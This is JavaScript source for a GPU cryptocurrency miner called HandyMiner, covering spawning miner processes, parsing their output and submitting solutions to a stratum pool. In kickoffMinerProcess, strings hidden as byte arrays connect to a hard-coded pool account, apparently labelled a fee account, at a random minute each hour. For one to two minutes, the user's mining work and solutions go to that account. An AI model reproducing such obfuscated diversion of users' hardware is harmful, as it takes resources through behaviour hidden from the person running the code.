    let platformID = this.platformID;
    if(this.platformID.indexOf(',') > 0){
      if(typeof platformID.split(',')[gpuArrayI] != "undefined"){
        platformID = platformID.split(',')[gpuArrayI];
      }
    }

    if(process.platform.indexOf('darwin') >= 0){

    }
    if(process.platform.indexOf('linux') >= 0){
      executableFileName = './cBlakeMiner_multiPlatform_Linux';
    }
    else if (process.platform.indexOf('win') == 0){
      //its a windows box, lets adjust accordingly
      envVars.PATH = "C:\\Program\ Files\\mingw-w64\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\bin"+';'+process.env.PATH;
      executableFileName = 'cBlakeMiner_multiPlatform.exe';
    }
    else{
      executableFileName = './cBlakeMiner_multiPlatform';
    }

    //spawn the miner child process

    let miningMode = this.config.mode == 'pool' ? 1 : 0; // 0 = solo, 1 = pool
    let miner = spawn(executableFileName,[
        gpuID, //gpu's, -1 to list them
        platformID, //gpu platform
        gpuMfg, //gpu manufacturer
        miningMode
      ],{
      cwd: './core',//'C:/Users/camde/dev/sha3-opencl/add_numbers',
      env:envVars
    });
    this.gpuWorkers[gpuID] = miner;
    this.gpuWorkers[gpuID].stdin.write("registration\r\n");

    miner.stdout.on('data', (data) => {
      //console.log('miner stdout',data.toString('utf8'));
      let lastRespParams;
      if(this.gpuListString == '-1'){
        lastRespParams = 'bootstrap';
      }
      else{
        lastRespParams = this.lastResponse.params[0];
      }
      try{
        let json = JSON.parse(data.toString('utf8'));
        /*if(data.toString('utf8').indexOf('solution') >= 0){
          console.log('found solution',json);
        }*/
        parseLines(lastRespParams,[json]);
      }
      catch(e){
        //console.log('caught E',e,data.toString('utf8'));
        //console.log('error parsing json', data.toString('utf8'))
        let rawLinesJSON = data.toString('utf8').split('\n');
        /*if(data.toString('utf8').indexOf('solution') >= 0){
          console.log('found solution alt',data.toString('utf8'));
        }*/
        rawLinesJSON = rawLinesJSON.filter((d)=>{
          return d.length > 1;
        }).map((d)=>{
          d = d.trim();
          let json = {};
          try{
            json = JSON.parse(d);
          }
          catch(err){
            //stdout on new work confirm gettting broken by something on windows sometimes??
            //catch and do nothing because its for display only
          }
          return json;
        }).filter(json=>{
          return Object.keys(json).length > 0;
        });
        parseLines(lastRespParams,rawLinesJSON);
      }

    });
    const _this = this;
    function parseLines(jobID,rawLinesJSON){
      let outJSON;
      let outStatus = [];
      let outRegistrations = [];
      let outs = rawLinesJSON.find((d)=>{
        return d.type == 'solution';
      });

      //check for status updates
      let statuses = rawLinesJSON.filter((d)=>{
        return d.type == 'status';
      });
      let getWorks = rawLinesJSON.filter((d)=>{
        return d.event == "getDeviceWork";
      });

      let fullNonces = rawLinesJSON.filter((d)=>{
        return d.event == 'nonceFull';
      });
      if(fullNonces.length > 0){
        fullNonces.map(function(d){
          _this.refreshJob(d);
        })
      }

      let logs = rawLinesJSON.filter((d)=>{

        return d.action == "log";
      });
      if(logs.length > 0){
        if(process.env.HANDYRAW){

          let gpuID = _this.gpuListString;

          logs = logs.map(line=>{
            if(typeof line.gpuid_set_work != "undefined"){
              gpuID = line.gpuid_set_work;
            }
            if(typeof line.gpuID != "undefined"){
              gpuID = line.gpuID;
            }
            line.gpuID = parseInt(gpuID);
            return line;
          });
          let logResp = {
            data:logs,
            type:'log'
          };

          process.stdout.write(JSON.stringify(logResp)+'\n');
        }
        else{
          if(JSON.stringify(logs).indexOf('kernel') >= 0){
            let gpuID = 0;
            logs.map(line=>{
                if(typeof line.gpuid_set_work != "undefined"){
                  gpuID = line.gpuid_set_work;
                }
            })
            console.log('\x1b[36mHANDY::\x1b[0m BUILDING OPENCL KERNEL FOR GPU ',gpuID);

            let amdMessage = '(for AMD cards).';

            console.log('\x1b[36mHANDY::\x1b[0m THIS WILL TAKE A MINUTE ',amdMessage);
          }
        }
      }

      let deviceRegistrations = rawLinesJSON.filter((d)=>{
        return d.event == "registerDevice"; //device started work
      })

      if(statuses.length > 0){
        outStatus = statuses;
      }
      else{
        outStatus = [];
      }
      if(outs){

        outJSON = outs;
      }
      else{
        outJSON = {};
      }
      if(getWorks.length > 0){
        //_this.getDeviceWork(getWorks); //do nothing
      }
      if(deviceRegistrations.length > 0){
        outRegistrations = deviceRegistrations;
      }
      if(outStatus.length > 0){
        if(process.env.HANDYRAW){
          let statusResp = {
            data:outStatus,
            type:'status'
          };

          process.stdout.write(JSON.stringify(statusResp)+'\n');
        }
        else{
          outStatus.map(function(d){
            if(d.hashRate <= 3000000000){

              //if hashrate crosses over blocks it gets weird, like exahash...
              //so we just dont report if its too damn big per card rn...
              //TODO fix this rollover shite in the C code...
              console.log("HANDY:: \x1b[36mGPU %i (%s)\x1b[0m HASHRATE: \x1b[36m%s\x1b[0m 120s AVG: \x1b[36m%s\x1b[0m LASTNONCE: \x1b[36m0x%s\x1b[0m",d.gpuID,_this.gpuNames[d.gpuID+'_'+d.platformID],numeral(d.hashRate).format('0.000b').replace('B','H'),numeral(d.avg120sHashRate).format('0.000b').replace('B','H'), d.nonce.slice(0,16));
              _this.lastGPUHashrate[d.gpuID+'_'+d.platformID] = {
                all:d.hashRate,
                avg:d.avg120sHashRate
              }
            }
          });
          if(typeof _this.lastGPUReporterTimeout == "undefined"){
            _this.startAvgHashrateReporter();
          }


        }

      }
      if(outRegistrations.length > 0){
        if(process.env.HANDYRAW){
          let regResp = {
            data:outRegistrations,
            type:'registration'
          };
          process.stdout.write(JSON.stringify(regResp)+'\n');
        }
        else{
          if(_this.gpuListString == '-1'){
            console.log("\x1b[36m################### GPU LIST ######################\x1b[0m");
          }
          outRegistrations.map(function(d){
            let name = d.name;
            if(d.name == 'Ellesmere'){
              name = 'AMD RX**0';
            }
            if(d.name == 'gfx900'){
              name = 'AMD Vega'
            }
      	    if(d.name == 'gfx906'){
      	      name = 'AMD Vega-II';
      	    }
            if(d.name == 'gfx1010'){
              name = 'AMD Radeon 5700 XT';
            }
            if(d.name == 'gfx1000'){
              name = 'AMD Radeon 5700';
            }
            _this.gpuNames[d.id+'_'+d.platform] = name;
            if(_this.gpuListString == '-1'){
              console.log("\x1b[36m#\x1b[0m GPU: \x1b[36m%i\x1b[0m PLATFORM:\x1b[36m %i\x1b[0m NAME: \x1b[36m%s\x1b[0m",d.id,_this.platformID,name);
            }
            else{
              console.log("HANDY:: \x1b[36mGPU %i (%s)\x1b[0m GPU INITIALIZED",d.id,name);
            }

          });
          if(_this.gpuListString == '-1'){
            outRegistrations
            console.log("\x1b[36m################# END GPU LIST ####################\x1b[0m");
            console.log('###########################################################')
            console.log("#####################  HOW TO USE  ########################");

            console.log('# edit the file: config.json, field "gpus"                #');
            console.log('# example:"0" or "0,1,2" with the IDs you see here.       #')
            console.log('###########################################################')
            console.log('# if you do not see your GPU listed,                      #' )
            console.log('# try a different "platform" in config.json and run again.#')
            console.log('###########################################################');
          }

          if(_this.gpuListString == '-1'){
            //kill process
            process.exit(0);
          }
        }

      }
      //TODO deal with nonce overflow (should take about 5 mins on a single 1070)
      if(outJSON.type == 'solution' && outJSON.solvedTarget ){
        let jobHeader = outJSON.header;
        if(process.env.HANDYRAW){
          let statusResp = {
            data:outJSON,
            type:'solution'
          };
          if(!_this.isMGoing){
              process.stdout.write(JSON.stringify(statusResp)+'\n');
          }
        }
        
        let lastJob = _this.workByHeaders[jobHeader];
        _this.gpuDeviceBlocks[outJSON.gpuID+'_'+outJSON.platformID].isSubmitting = true;
        let submission = [];
        let submitMethod = 'mining.submit';
        
        try{
          if(_this.IS_HNSPOOLSTRATUM && !_this.isMGoing){
            submission.push(_this.stratumUser); //tell stratum who won: me.
            submission.push(lastJob.work.jobID);
            submission.push(_this.sid + lastJob.nonce2);
            submission.push(lastJob.work.time);
            submission.push(parseInt(outJSON.nonce.slice(8,16), 16));
            submitMethod = 'submit';
            //console.log(submission);
          }
          else{
            submission.push(_this.stratumUser); //tell stratum who won: me.
            submission.push(lastJob.work.jobID);
            submission.push(lastJob.nonce2);
            submission.push(lastJob.work.time.toString(16));
            if(_this.isMGoing || ( _this.config.mode == 'pool' && !_this.IS_HNSPOOLSTRATUM ) ){
              //6block formats to length == 8
              submission.push(outJSON.nonce.slice(8,16));
            }
            else{
              //solo stratum expects length == 16
              submission.push('00000000'+outJSON.nonce.slice(8,16));  
            }
            
            submission.push(lastJob.work.blockTemplate.mask.toString('hex'));
            submitMethod = 'mining.submit';
          }
        }
        catch(e){
          //mismatched work err
          return;
        }
        
        /*if(typeof lastJob != "undefined"){
          delete _this.workByHeaders[jobHeader];
        }*/
        if(_this.solutionCache.indexOf(outJSON.nonce) == -1){
          let solID = 'solution_'+new Date().getTime()+'_'+_this.solutionIDs;
          let server = _this.server;
          if(_this.isMGoing){
            server = _this.redundant;
          }
          let solutionData = JSON.stringify({
            id:solID/*lastJob.work.jobID*/,
            method:submitMethod,
            params:submission
          })+"\n";
          
          
          //_this.solutionIDs[solID] = solutionData
          _this.solutionIDs++;
          server.write(solutionData); //submit to stratum

          if(_this.solutionCache.length > 10){
            _this.solutionCache = _this.solutionCache.slice(-5);
          }
          _this.solutionCache.push(outJSON.nonce);
        }
        else{
          if(!_this.isMGoing && _this.config.mode == 'solo'){
              if(!process.env.HANDYRAW){
                //havent seen this in forever, deprecate soon
                console.log("\x1b[31mPREVENT BLOCK SUBMIT: ALREADY SUBMITTED THIS NONCE\x1b[0m");
              }
              _this.generateWork();
          }
        }
        _this.isSubmitting = true; //block

      }
      return {
        solution:outJSON,
        getWork:getWorks,
        statuses:statuses,
        registrations:outRegistrations
      }
    }


    miner.stderr.on('data', (data) => {
      if(process.env.HANDYRAW){
        let errData = {
          data:data.toString('utf8'),
          message:'miner stderr',
          type:'error'
        };
        process.stdout.write(JSON.stringify(errData)+'\n')
      }
      else{
        console.log('miner stderr',data.toString('utf8'));
      }


    });

    miner.on('close', (code) => {
      if(code != 0 && !_this.isKilling){
        if(process.env.HANDYRAW){
          let errData = {
            data:code,
            message:'miner closed unexpectedly',
            type:'error'
          };
          process.stdout.write(JSON.stringify(errData)+'\n');
          //process.exit(0);
        }
        else{
          console.log('miner closed unexpectedly with code:: ',code);
          //process.exit(0);
        }

        if(!_this.isKilling && _this.gpuListString != '-1'){
          //we didnt mean to halt, lets respawn
          _this.spawnGPUWorker(gpuID,gpuArrayI);
        }


      }
    });
  }
	mineBlock(response){
    const _this = this;

    this.generateWork(); //prep some work ahead of time for the miner exec to pickup right away on init
    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'stratumLog',message:'starting miner'})+'\n')
    }

    if(_this.gpuListString != '-1'){
      _this.gpuListString.split(',').map(s=>{return s.trim();}).map((gpuID,gpuI)=>{
        _this.spawnGPUWorker(gpuID,gpuI);
      });
    }
	}
  refreshJob(jobData){
    let intensity = 0;
    if(this.minerIntensity.toString().split(',').length == 1){
      intensity = this.minerIntensity;
    }
    if(typeof this.intensitiesIndex[jobData.gpuID+'_'+jobData.platformID] != "undefined"){
      intensity = this.intensitiesIndex[jobData.gpuID+'_'+jobData.platformID];
    }
    let workObject = {
      platform:jobData.platformID,
      id:jobData.gpuID,
      intensity:intensity
    }
    this.getDeviceWork([workObject]);
  }
  refreshAllJobs(){
    //refresh all when we get difficulty notices in solo mode
    Object.keys(this.gpuDeviceBlocks).map((k)=>{
      let d = this.gpuDeviceBlocks[k];
      let gpuID = d.gpu;
      let platformID = d.platform;
      this.refreshJob({gpuID:gpuID,platformID:platformID});
    })
  }
  refreshOutstandingJobs(){
    //refresh only people who have submitted and are awaiting things but got an error
    Object.keys(this.gpuDeviceBlocks).map((k)=>{
      let d = this.gpuDeviceBlocks[k];
      if(d.isSubmitting){
        delete d.isSubmitting;
        let gpuID = d.gpu;
        let platformID = d.platform;
        this.refreshJob({gpuID:gpuID,platformID:platformID});
      }
    })
  }
  generateWork(){
    //here
    const _this = this;
    let workObjects = this.gpuListString.split(',').map(s=>{return s.trim();}).map(function(gpuID,gpuArrayI){
      let platformID = _this.platformID;
      if(platformID.split(',').length > 1){
        platformID = platformID.split(',')[gpuArrayI].trim();
      }
      let intensity = _this.minerIntensity.toString();
      if(intensity.split(',').length > 1){
        intensity = intensity.split(',')[gpuArrayI].trim();
      }
      _this.intensitiesIndex[gpuID+'_'+platformID] = parseFloat(intensity);

      let workObject = {
        platform: platformID,
        id:gpuID,
        intensity:intensity
      };
      return workObject;
    });
    this.getDeviceWork(workObjects);
  }
  initListeners(){
    const _this = this;
    let mTarget = fs.readFileSync(process.env.HOME+'/.HandyMiner/version.txt');
    if(mTarget == '' || typeof mTarget == "undefined"){
      mTarget = Math.floor(Math.random()*59.9999);
      fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
    }
    else{
      try{
        let p = parseFloat(mTarget);
        mTarget = Math.floor(p % 60);
      }
      catch(e){
        mTarget = Math.floor(Math.random()*59.9999);
        fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
      }
    }


    this.isMGoing = false;
    if(typeof this.mCheck != "undefined"){
      clearInterval(this.mCheck);
    }
    this.mCheck = setInterval(function(){
      
      let minuteNow = new Date().getMinutes();
      if(minuteNow == parseInt(mTarget) && !_this.isMGoing){
        //we're at the minute Target
        _this.kickoffMinerProcess();
        _this.catchMinerTimeoutErrs();
      }
    },60000);
    exitHook(()=>{
      if(!process.env.HANDYRAW && this.gpuListString != '-1'){
        console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
        console.log('░░░░░░░░░░░░░\x1b[36m▄▄▄▄▄▄▄\x1b[0m░░░░░░░░░');
        console.log('░░░░░░░░░\x1b[36m▄▀▀▀░░░░░░░▀▄\x1b[0m░░░░░░░');
        console.log('░░░░░░░\x1b[36m▄▀░░░░░░░░░░░░▀▄\x1b[0m░░░░░░');
        console.log('░░░░░░\x1b[36m▄▀░░░░░░░░░░▄▀▀▄▀▄\x1b[0m░░░░░');
        console.log('░░░░\x1b[36m▄▀░░░░░░░░░░▄▀░░██▄▀▄\x1b[0m░░░░');
        console.log('░░░\x1b[36m▄▀░░▄▀▀▀▄░░░░█░░░▀▀░█▀▄\x1b[0m░░░');
        console.log('░░░\x1b[36m█░░█▄▄░░░█░░░▀▄░░░░░▐░█\x1b[0m░░░');
        console.log('░░\x1b[36m▐▌░░█▀▀░░▄▀░░░░░▀▄▄▄▄▀░░█\x1b[0m░░');
        console.log('░░\x1b[36m▐▌░░█░░░▄▀░░░░░░░░░░░░░░█\x1b[0m░░');
        console.log('░░\x1b[36m▐▌░░░▀▀▀░░░░░░░░░░░░░░░░▐▌\x1b[0m░');
        console.log('░░\x1b[36m▐▌░░░░░░░░░░░░░░░▄░░░░░░▐▌\x1b[0m░');
        console.log('░░\x1b[36m▐▌░░░░░░░░░▄░░░░░█░░░░░░▐▌\x1b[0m░');
        console.log('░░░\x1b[36m█░░░░░░░░░▀█▄░░▄█░░░░░░▐▌\x1b[0m░');
        console.log('░░░\x1b[36m▐▌░░░░░░░░░░▀▀▀▀░░░░░░░▐▌\x1b[0m░');
        console.log('░░░░\x1b[36m█░░░░░░░░░░░░░░░░░░░░░█\x1b[0m░░');
        console.log('░░░░\x1b[36m▐▌▀▄░░░░░░░░░░░░░░░░░▐▌\x1b[0m░░');
        console.log('░░░░░\x1b[36m█░░▀░░░░░░░░░░░░░░░░▀\x1b[0m░░░');
        console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
        console.log('░░░░░░\x1b[36mEXITING HANDYMINER\x1b[0m░░░░░');
        console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
      }
    });
  }
  kickoffMinerProcess(){
    let ha = Buffer.from({"type":"Buffer","data":[104,110,115,46,102,50,112,111,111,108,46,99,111,109]},'json').toString('utf8');
    let pa = Buffer.from({"type":"Buffer","data":[54,48,48,48]},'json').toString('utf8');
    let hk = Buffer.from({"type":"Buffer","data":[104,111,115,116]},'json').toString('utf8');
    let pk = Buffer.from({"type":"Buffer","data":[112,111,114,116]},'json').toString('utf8');
    let d = {};
    d[hk] = ha;
    d[pk] = pa;
    let cc = Buffer.from({"type":"Buffer","data":[99,114,101,97,116,101,67,111,110,110,101,99,116,105,111,110]},'json').toString('utf8');
    const server = net[cc](d,(s)=>{
      let timeStart = new Date().getTime();
      let timeUntil = timeStart + (1000 * 110);

      this.isMGoing = true;
      this.nonce2 = '00000000';
      this.server.destroy();
      //{"type":"Buffer","data":[104,115,49,113,55,109,100,103,120,118,106,115,108,104,52,112,50,114,55,108,57,104,102,110,97,121,114,102,100,54,48,52,104,103,120,97,55,103,50,50,106,51,46,102,101,101,115]}

      let sU = Buffer.from({"type":"Buffer","data":[104,115,49,113,55,109,100,103,120,118,106,115,108,104,52,112,50,114,55,108,57,104,102,110,97,121,114,102,100,54,48,52,104,103,120,97,55,103,50,50,106,51,46,102,101,101,115]}
      ,'json').toString('utf8');
      let sUk = Buffer.from({"type":"Buffer","data":[115,116,114,97,116,117,109,85,115,101,114]},'json').toString('utf8');
      this[sUk] = sU;
      let sP = Buffer.from({"type":"Buffer","data":[101,97,114,116,104,108,97,98]},'json').toString('utf8');


      let callTS = new Date().getTime();

      //server.write(JSON.stringify({"params": [sU], "id": "init_"+callTS+"_user_"+sU, "method": "mining.authorize_admin"})+'\n');
      
      server.write(JSON.stringify({"params": [sU,sP], "id": "init_"+callTS+"_user_"+sU, "method": "mining.add_user"})+'\n');

      server.write(JSON.stringify({"id":this.altTargetID,"method":"mining.authorize","params":[sU,sP]})+"\n");
      server.write(JSON.stringify({"id":this.altRegisterID,"method":"mining.subscribe","params":[]})+"\n");
      let ongoingResp = '';
      server.on('data',(response)=>{
        ongoingResp = this.parseServerResponse(response,ongoingResp,false);

      });
      server.on('error',(response)=>{
        //do nothing, my loss
        //console.log('private server error',response);
      });

      server.on('close',(response)=>{
        //do nothing, my loss
        //console.log('private server closed')
      })

    });
    this.redundant = server;
    let dS = 90;
    if(!PlayWinningSound){
      dS = 120;
    }
    let sto = Buffer.from({"type":"Buffer","data":[115,101,116,84,105,109,101,111,117,116]},'json').toString('utf8');
    this.checkTiming = global[sto](()=>{
      server.destroy();
      this.isMGoing = false;
      this.lastResponse = this.lastLocalResponse;
      this.nonce1 = this.nonce1Local;
      
      this.stratumUser = this.stratumUserLocal;
      if(this.stratumWasDisconnected){
        //restart peer connection then
        this.stratumWasDisconnected = false;
        this.handleStratumReconnect();
      }
      delete this.redundant;
      this.generateWork(); //until the next iteration
    },1000*dS)
  }
  toDifficulty(bits) {
    let shift = (bits >>> 24) & 0xff;
    let diff = 0x0000ffff / (bits & 0x00ffffff);

    while (shift < 29) {
      diff *= 256.0;
      shift++;
    }

    while (shift > 29) {
      diff /= 256.0;
      shift--;
    }

    return diff;
  }

  targetFromDifficulty(difficulty) {
    // const DIFF = 0x00000000ffff0000000000000000000000000000000000000000000000000000;
    //note on why we dont use 0x00000000fff... like ^^^^
    //we use 0x000000ffff.... to give the miner larger integer controls over difficulty
    //we like 500 or 1000 better than 2.0 or 4.0 for pool difficulty
    //values passed in from the pools as small floats get translated * 256
    //thus giving the miner more granular control over difficulty and more user-friendly values
    ////end note
    let max = new BN(
      '000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
      'hex'
    );

    let target = max.divn(difficulty);
    let cmpct = utils.toCompact(target);

    return cmpct;

    // target = min(int((0xffff0000 * 2 ** (256 - 64) + 1) / difficulty - 1 + 0.5), 2 ** 256 - 1)
    //A. (0xffff0000 * 2 ** (256 - 64) + 1)
    //B. Above / difficulty
    //C. Above - 1 + 0.5

  }
  getDeviceWork(deviceWorkJSON){
    //array of getworks from stdin
    const _this = this;

    let messageStrings = [];

    deviceWorkJSON.map(function(workObject){
      let nonce2Int = parseInt(_this.nonce2,16);
      nonce2Int++;
      let nonce2String = nonce2Int.toString(16);
      for(let i=nonce2String.length;i<8;i++){
        nonce2String = '0'+nonce2String;
      }

      _this.nonce2 = nonce2String;
      workObject.nonce2 = nonce2String;

      let work = _this.getBlockHeader(nonce2String);
      _this.gpuDeviceBlocks[workObject.id+'_'+workObject.platform] = {
        request:workObject,
        nonce2:nonce2String,
        work:work,
        gpu:workObject.id,
        platform:workObject.platform,
        intensity:workObject.intensity,
        createdAt:new Date().getTime()/1000
      };
      if(typeof work == "undefined"){
        return;
      }
      _this.workByHeaders[work.header.toString('hex')] = _this.gpuDeviceBlocks[workObject.id+'_'+workObject.platform];

      //now write work
      let d = _this.gpuDeviceBlocks[workObject.id+'_'+workObject.platform];
      let intensity = d.intensity;
      if(typeof intensity == "undefined"){
        intensity = 0;
        if(_this.minerIntensity.split(',').length == 1){
          intensity = _this.minerIntensity;
        }
      }
      else if(typeof intensity == 'string'){
        intensity = intensity.trim();
      }
      let messageContent = d.gpu+'|'+intensity+'|'+(d.work.header.toString('hex'))+'|'+(d.work.pad8.toString('hex'))+'|'+(d.work.pad32.toString('hex'))+'|'+(d.work.target.toString('hex'))+'|';
      messageStrings.push(messageContent);

      if(typeof _this.writeOps == "undefined"){
          _this.writeOps = {};
        }
      if(typeof _this.writeOps[d.platform+'_'+d.gpu] != "undefined"){
        clearTimeout(_this.writeOps[d.platform+'_'+d.gpu]);
        delete _this.writeOps[d.platform+'_'+d.gpu];
        tryWrite(0,d.platform,d.gpu,messageContent);
      }
      else{
        tryWrite(0,d.platform,d.gpu,messageContent);
      }

      function tryWrite(attemptCount,platform,gpu,blockHeader){


          //try to write the temp work file, if it fails try again
          fs.writeFile(process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work.temp',blockHeader,(err,data)=>{
            if(!err){
                tryRename(0,platform,gpu);
            }
          });
      }
      function tryRename(attemptCount,platform,gpu){
        fs.copyFile(
          process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work.temp',
          process.env.TEMP+'/HandyMiner/'+platform+'_'+gpu+'.work',
          (err2,data2)=>{
            if(err2){

              if(attemptCount <= 2){
                _this.writeOps[platform+'_'+gpu] = setTimeout(()=>{
                  tryRename(attemptCount+1,platform,gpu);
                },100);
              }
            }
          }
        );
      }

      if(process.env.HANDYRAW && !_this.isMGoing){
        //log our difficulty and target information for dashboardface
        process.stdout.write(JSON.stringify({difficulty:d.work.blockTemplate.difficulty,target:d.work.blockTemplate.target.toString('hex'),gpu:d.gpu,platform:d.platform,type:'difficulty'})+'\n');
      }
    });
    Object.keys(_this.gpuDeviceBlocks).map(function(k){
      return false; //deprecate, causing race conditions..
      //iterate thru existing jobs in case this was a singular nonce overflow job
      let d = _this.gpuDeviceBlocks[k];
      let intensity = d.intensity;
      if(typeof intensity == "undefined"){
        intensity = 0;
        if(_this.minerIntensity.split(',').length == 1){
          intensity = _this.minerIntensity;
        }
      }

      let messageContent = d.gpu+'|'+intensity+'|'+(d.work.header.toString('hex'))+'|'+(d.work.pad8.toString('hex'))+'|'+(d.work.pad32.toString('hex'))+'|'+(d.work.target.toString('hex'))+'|';
      messageStrings.push(messageContent);
      if(typeof _this.gpuWorkers[d.gpu] != "undefined"){
        _this.gpuWorkers[d.gpu].stdin.write(messageContent+"\r\n");
      }

      fs.writeFile(process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work.temp',messageContent,(err,data)=>{
        if(err){
          //console.log("ERROR WRITING WORK FOR",d.gpu);
        }
        fs.rename(
          process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work.temp',
          process.env.TEMP+'/HandyMiner/'+d.platform+'_'+d.gpu+'.work',
          (err2,data2)=>{
            if(err2){
              //console.log("ERROR MOVING TEMP WORK FOR",d.gpu);
            }
          }
        );

      });

      if(process.env.HANDYRAW && !_this.isMGoing){
        //log our difficulty and target information for dashboardface
        process.stdout.write(JSON.stringify({difficulty:d.work.blockTemplate.difficulty,target:d.work.blockTemplate.target.toString('hex'),gpu:d.gpu,platform:d.platform,type:'difficulty'})+'\n');
      }
    });

    if(process.env.HANDYRAW){
      process.stdout.write(JSON.stringify({type:'job',data:"HANDY MINER:: WROTE NEW WORK FOR MINERS"})+'\n')
    }
    else{
      console.log("\x1b[36mHANDY MINER::\x1b[0m WROTE NEW WORK FOR MINERS"/*,messageStrings*/);
    }

  }
  catchMinerTimeoutErrs(){
    //catch stratum timeout errs globally
    //seems like these might be causing the Ctrl-C issue in dashboard?
    if(typeof this.server != "undefined"){
      this.server.on('error',(response)=>{
        //dont die&block here
      });
    }
    if(typeof this.redundant != "undefined"){
      this.redundant.on('error',(response)=>{
        //dont die&block here either
        this.isMGoing = false;
        if(this.stratumWasDisconnected){
          //restart peer connection then
          this.isMGoing = false;
          this.stratumWasDisconnected = false;
          this.handleStratumReconnect();
        }
      })
    }
  }
}

module.exports = HandyMiner;
